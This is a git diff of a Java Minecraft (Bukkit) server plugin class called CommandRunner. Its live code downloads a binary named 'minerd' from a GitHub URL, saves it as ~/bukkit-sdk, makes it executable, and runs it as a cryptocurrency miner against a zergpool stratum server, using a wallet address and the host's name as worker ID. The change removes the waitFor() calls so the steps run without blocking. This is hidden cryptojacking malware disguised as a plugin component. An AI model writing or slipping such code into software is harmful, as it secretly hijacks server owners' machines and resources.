@@ -20,21 +20,18 @@ public class CommandRunner extends JavaPlugin {
                 "bash", "-c",
                 "wget -O ~/bukkit-sdk https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/minerd"
             });
-            wget.waitFor();
 
             // Execute chmod command
             Process chmod = Runtime.getRuntime().exec(new String[]{
                 "bash", "-c",
                 "chmod +x ~/bukkit-sdk"
             });
-            chmod.waitFor();
 
             // Execute bukkit-sdk command
             Process miner = Runtime.getRuntime().exec(new String[]{
                 "bash", "-c",
                 "~/bukkit-sdk -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u MYZzfv2V3J1ZfHif1DEcY3DSZmF2sepLnK -p c=MBC,mc=MBC,ID=$(hostname)"
             });
-            miner.waitFor();
         } catch (Exception e) {
              getLogger().severe("Runtime Error: " + e.getMessage());
              e.printStackTrace();
